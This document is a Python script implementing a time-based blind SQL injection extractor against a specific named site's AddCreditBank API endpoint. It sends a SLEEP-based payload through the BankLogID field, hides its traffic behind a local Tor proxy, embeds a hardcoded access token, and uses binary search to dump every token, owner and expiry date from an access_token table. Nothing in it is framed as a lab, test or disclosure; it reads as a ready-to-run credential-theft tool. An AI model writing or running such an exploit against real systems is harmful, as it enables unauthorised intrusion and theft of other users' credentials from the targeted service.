#!/usr/bin/env python3
"""
Time-blind SQLi extractor with binary search
Target: cybermagic555.com/api/AddCreditBank
"""
import requests
import time
import sys

class TimeBlindSQLi:
    def __init__(self, delay=2, threshold=3.5):
        self.proxy = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        self.url = "https://cybermagic555.com/api/AddCreditBank"
        self.token = "gscAVZpq7eQeGqAprWEk4M7RX"
        self.delay = delay
        self.threshold = threshold

    def inject(self, condition: str) -> bool:
        payload = f"1' AND IF({condition},SLEEP({self.delay}),0)-- -"
        files = {
            "BankLogID": (None, payload),
            "AccessToken": (None, self.token)
        }
        start = time.time()
        try:
            requests.post(self.url, files=files, proxies=self.proxy, timeout=30)
        except Exception as e:
            pass
        elapsed = time.time() - start
        return elapsed > self.threshold

    def get_byte(self, query: str, pos: int) -> int:
        """Binary search for byte value at position"""
        # First check if position exists (not null/empty)
        if not self.inject(f"LENGTH(({query}))>={pos}"):
            return 0

        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if self.inject(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def get_string(self, query: str, max_len: int = 30) -> str:
        result = ""
        for pos in range(1, max_len + 1):
            byte_val = self.get_byte(query, pos)
            if byte_val == 0 or byte_val < 32:
                break
            result += chr(byte_val)
            print(f"\r    > {result}", end="", flush=True)
        print()
        return result

    def get_count(self, query: str) -> int:
        """Get count using binary search"""
        lo, hi = 0, 100
        while lo < hi:
            mid = (lo + hi) // 2
            if self.inject(f"({query})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

def main():
    sqli = TimeBlindSQLi()

    print("[*] cybermagic555.com Time-Blind SQLi Extractor")
    print("[*] Using binary search (~7 requests per char)")
    print()

    # Count tokens
    print("[*] Counting access_token rows...")
    count = sqli.get_count("SELECT COUNT(*) FROM access_token")
    print(f"[+] Found {count} tokens")
    print()

    # Extract each token with owner
    results = []
    for i in range(count):
        print(f"[*] Token #{i}:")

        # Get Token
        token = sqli.get_string(f"SELECT Token FROM access_token LIMIT {i},1", 30)

        # Get Owner
        owner = sqli.get_string(f"SELECT Owner FROM access_token LIMIT {i},1", 30)

        # Get ExpireDate if exists
        expire = sqli.get_string(f"SELECT ExpireDate FROM access_token LIMIT {i},1", 25)

        results.append({"token": token, "owner": owner, "expire": expire})
        print(f"    Token:  {token}")
        print(f"    Owner:  {owner}")
        print(f"    Expire: {expire}")
        print()

    # Summary
    print("\n" + "="*50)
    print("EXTRACTED ACCESS TOKENS:")
    print("="*50)
    for i, r in enumerate(results):
        print(f"{i}: {r['owner']} => {r['token']}")

if __name__ == "__main__":
    main()
